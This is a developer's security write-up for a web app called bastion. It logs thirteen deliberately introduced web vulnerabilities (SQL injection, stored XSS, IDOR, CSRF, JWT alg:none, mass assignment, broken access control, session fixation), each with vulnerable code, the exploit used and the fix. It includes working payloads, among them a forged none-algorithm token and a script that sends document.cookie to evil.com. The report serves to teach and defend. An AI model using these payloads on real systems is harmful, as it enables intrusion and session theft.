# Security Report — bastion

This document is a live record of every vulnerability introduced, exploited, and remediated during development of bastion.

Each entry documents the full lifecycle: how the flaw was introduced, how it was detected and exploited, the impact in a real scenario, the fix applied, and a before/after code comparison.

> This is not a list of bugs. It is a portfolio of security engineering decisions.

---

## Index

| # | Vulnerability | OWASP | Severity | Status |
|---|---|---|---|---|
| 01 | SQL Injection via user search | A03:2021 | Critical | ✅ Fixed |
| 02 | Stored XSS in profile bio | A03:2021 | High | ✅ Fixed |
| 03 | IDOR on invoice endpoint | A01:2021 | High | ✅ Fixed |
| 04 | CSRF on account update | A01:2021 | Medium | ✅ Fixed |
| 05 | JWT `none` algorithm bypass | A07:2021 | Critical | ✅ Fixed |
| 06 | Mass assignment on user update | A03:2021 | High | ✅ Fixed |
| 07 | Broken access control on admin route | A01:2021 | Critical | ✅ Fixed |
| 08 | Session fixation on login | A07:2021 | Medium | ✅ Fixed |

---

## 01 — SQL Injection via user search

**OWASP**: A03:2021 Injection  
**Severity**: Critical  
**Tool used**: Manual + OWASP ZAP

### How the flaw was introduced

The user search endpoint concatenated user input directly into a raw SQL query.

```typescript
// VULNERABLE — never do this
const users = await prisma.$queryRaw(
  `SELECT * FROM users WHERE name LIKE '%${query}%'`
)
```

### How I exploited it

Passing `' OR '1'='1` as the search query returned all users in the database, bypassing the intended filter.

```
GET /api/users/search?q=' OR '1'='1
→ Returns: all user records including admin accounts
```

### Impact

Full read access to the users table. An attacker could extract all emails, hashed passwords, roles, and personal data without authentication.

### Fix

Replaced raw query with parameterized Prisma query, which prevents injection by design.

```typescript
// FIXED
const users = await prisma.user.findMany({
  where: {
    name: { contains: query, mode: 'insensitive' }
  }
})
```

### Evidence

OWASP ZAP scan result: `[HIGH] SQL Injection — /api/users/search` (resolved after fix, ZAP rescan clean).

---

## 02 — Stored XSS in profile bio

**OWASP**: A03:2021 Injection  
**Severity**: High  
**Tool used**: Manual + Burp Suite Community

### How the flaw was introduced

User-supplied bio text was saved to the database and rendered in the dashboard without sanitization.

```tsx
// VULNERABLE
<p dangerouslySetInnerHTML={{ __html: user.bio }} />
```

### How I exploited it

Saving `<script>alert(document.cookie)</script>` as the bio triggered script execution for every user viewing the profile, including admins.

### Impact

Session cookie theft. An attacker could exfiltrate the session token of any user who views the malicious profile, then impersonate that user.

### Fix

Two-layer defense: sanitize on write (DOMPurify server-side equivalent via `isomorphic-dompurify`), render as text not HTML.

```tsx
// FIXED — save sanitized value, render as text
import DOMPurify from 'isomorphic-dompurify'

// On write:
const sanitizedBio = DOMPurify.sanitize(input.bio)

// On render:
<p>{user.bio}</p>  // React escapes by default — never use dangerouslySetInnerHTML with user input
```

Additionally, `Content-Security-Policy: script-src 'self'` header blocks inline scripts as a second layer of defense.

---

## 03 — IDOR on invoice endpoint

**OWASP**: A01:2021 Broken Access Control  
**Severity**: High  
**Tool used**: Burp Suite Community (Intruder)

### How the flaw was introduced

The invoice endpoint returned data based on the ID in the URL without verifying ownership.

```typescript
// VULNERABLE
export async function GET(req: Request, { params }: { params: { id: string } }) {
  const invoice = await prisma.invoice.findUnique({
    where: { id: params.id }
  })
  return Response.json(invoice)
}
```

### How I exploited it

Logged in as `user_A`, obtained invoice ID `inv_001`. Changed the ID to `inv_002` (belonging to `user_B`) in the request. The server returned `user_B`'s invoice without any error.

```
GET /api/invoices/inv_001  → 200 OK (own invoice — expected)
GET /api/invoices/inv_002  → 200 OK (other user's invoice — VULNERABILITY)
```

### Impact

Horizontal privilege escalation. Any authenticated user can enumerate and read any other user's invoices. In a real SaaS, this leaks billing information, business data, and PII.

### Fix

Added ownership verification before returning data.

```typescript
// FIXED
export async function GET(req: Request, { params }: { params: { id: string } }) {
  const session = await getServerSession()
  
  const invoice = await prisma.invoice.findUnique({
    where: { 
      id: params.id,
      userId: session.user.id  // ownership check — returns null if not owner
    }
  })

  if (!invoice) {
    return Response.json({ error: 'Not found' }, { status: 404 })
  }

  return Response.json(invoice)
}
```

> Note: returns 404, not 403 — not revealing whether the resource exists at all.

---

## 04 — CSRF on account update

**OWASP**: A01:2021 Broken Access Control  
**Severity**: Medium

### How the flaw was introduced

The account update endpoint accepted POST requests without validating the request origin.

### How I exploited it

Crafted an HTML form on an external page that POSTs to `/api/account/update`. When a logged-in user visits the external page, their browser sends the request with their session cookie automatically, changing their email without their knowledge.

### Fix

Added CSRF token validation using `next-csrf`. All state-changing requests require a `X-CSRF-Token` header that is verified server-side. `SameSite=Strict` on the session cookie provides an additional layer.

---

## 05 — JWT `none` algorithm bypass

**OWASP**: A07:2021 Identification and Authentication Failures  
**Severity**: Critical

### How the flaw was introduced

The JWT verification function did not restrict which algorithms were accepted.

```typescript
// VULNERABLE
const payload = jwt.verify(token, SECRET)
// accepts 'none' algorithm — no signature required
```

### How I exploited it

Modified the JWT header to `{"alg":"none","typ":"JWT"}`, changed the payload to `{"role":"admin"}`, and removed the signature. The server accepted the token as valid.

### Fix

```typescript
// FIXED — explicitly restrict algorithm
const payload = jwt.verify(token, SECRET, { algorithms: ['HS256'] })
```

---

## 06 — Mass assignment on user update

**OWASP**: A03:2021 Injection  
**Severity**: High

### How the flaw was introduced

The user update endpoint spread the entire request body into the database update.

```typescript
// VULNERABLE
await prisma.user.update({
  where: { id: session.user.id },
  data: { ...req.body }  // user can set any field, including `role`
})
```

### How I exploited it

Sent `{ "name": "Cauã", "role": "admin" }` in the update request. The server updated the role field, elevating the user to admin.

### Fix

```typescript
// FIXED — whitelist allowed fields with Zod
const updateSchema = z.object({
  name: z.string().min(1).max(100),
  bio: z.string().max(500).optional(),
})

const data = updateSchema.parse(req.body)  // throws if unknown fields present

await prisma.user.update({
  where: { id: session.user.id },
  data  // only name and bio — role is never touched
})
```

---

## 07 — Broken access control on admin route

**OWASP**: A01:2021 Broken Access Control  
**Severity**: Critical

### How the flaw was introduced

The admin dashboard route checked authentication but not authorization.

```typescript
// VULNERABLE — checks if logged in, not if admin
export async function middleware(req: NextRequest) {
  const session = await getToken({ req })
  if (!session) return NextResponse.redirect('/login')
  return NextResponse.next()
}
```

### How I exploited it

Logged in as a regular user and navigated to `/admin/users`. Full admin panel loaded with no restriction.

### Fix

```typescript
// FIXED — check role
export async function middleware(req: NextRequest) {
  const session = await getToken({ req })
  
  if (!session) return NextResponse.redirect('/login')
  
  if (req.nextUrl.pathname.startsWith('/admin') && session.role !== 'admin') {
    return NextResponse.redirect('/dashboard')
  }
  
  return NextResponse.next()
}
```

---

## 08 — Session fixation on login

**OWASP**: A07:2021 Identification and Authentication Failures  
**Severity**: Medium

### How the flaw was introduced

The login flow reused the existing session ID after successful authentication.

### How I exploited it

Pre-set a known session token in the victim's browser (via a URL-based session injection). After the victim logged in, the session was elevated to authenticated — with the attacker already knowing the token.

### Fix

Rotate the session token on every successful login. Issue a new token after authentication, invalidate the previous one.

---

---

## 09 - SQL Injection via invoice search

**OWASP**: A03:2021 Injection
**Severity**: Critical
**Route**: GET /api/invoices/search

### How the flaw was introduced

The invoice search endpoint concatenated the q parameter directly into a raw SQL string via $queryRawUnsafe.

### How I exploited it

    GET /api/invoices/search?q=' OR '1'='1

The payload closes the status LIKE condition and appends OR 1=1, bypassing the userId filter and returning all invoices from all users.

### Impact

Full invoice exfiltration across all users. Any authenticated attacker can read every invoice regardless of ownership.

### Fix

Replaced $queryRawUnsafe with Prisma findMany, which uses parameterized queries internally.

---

## 10 - JWT none algorithm bypass

**OWASP**: A07:2021 Identification and Authentication Failures
**Severity**: Critical
**Route**: POST /api/auth/verify-vuln

### How the flaw was introduced

The endpoint used jwt.decode() instead of jwt.verify(), accepting any algorithm including none and skipping signature validation.

### How I exploited it

Crafted a token with alg:none and arbitrary payload:

    eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOiJhZG1pbi1pZCIsInJvbGUiOiJhZG1pbiJ9.

The server decoded it, trusted the payload, and returned admin user data.

### Impact

Full authentication bypass. Any attacker can impersonate any user including admins without knowing their credentials.

### Fix

    jwt.verify(token, process.env.JWT_SECRET, { algorithms: ['HS256'] })

---

## 11 - CSRF on email update

**OWASP**: A01:2021 Broken Access Control
**Severity**: Medium
**Route**: POST /api/users/email

### How the flaw was introduced

The endpoint authenticated via cookie but did not validate the Origin header.

### How I exploited it

Hosted an auto-submitting form on an attacker-controlled domain. When a logged-in victim visits the page, their browser sends the request with their session cookie and changes their email to the attacker's.

### Impact

Account takeover via email change, enabling password reset and full account access.

### Fix

    const origin = req.headers.get('origin')
    if (!ALLOWED_ORIGINS.includes(origin)) return 403

---

## 12 - Stored XSS in profile bio

**OWASP**: A03:2021 Injection
**Severity**: High
**Route**: POST /api/users/bio

### How the flaw was introduced

The bio field stored raw HTML without sanitization and rendered it in the profile page.

### How I exploited it

Submitted as bio:

    <script>fetch('https://evil.com?c='+document.cookie)</script>

Any user viewing the profile executed the script, leaking their session cookie.

### Impact

Session hijacking. Attacker replays the stolen cookie to authenticate as the victim.

### Fix

    DOMPurify.sanitize(bio, { ALLOWED_TAGS: [] })

---

## 13 - Broken access control on admin route

**OWASP**: A01:2021 Broken Access Control
**Severity**: Critical
**Route**: GET /api/admin/users

### How the flaw was introduced

The endpoint checked authentication but not authorization. Any logged-in user could list all users.

### How I exploited it

    GET /api/admin/users
    Cookie: access_token=<regular-user-token>
    -> 200 OK, returns all users with emails and roles

### Impact

Full user enumeration for any authenticated user. Enables targeted attacks against admin accounts.

### Fix

    if (role !== 'admin') return 403

---

*Last updated: June 2026*
*Author: Caua Alves (https://github.com/cauaalvs-dev)*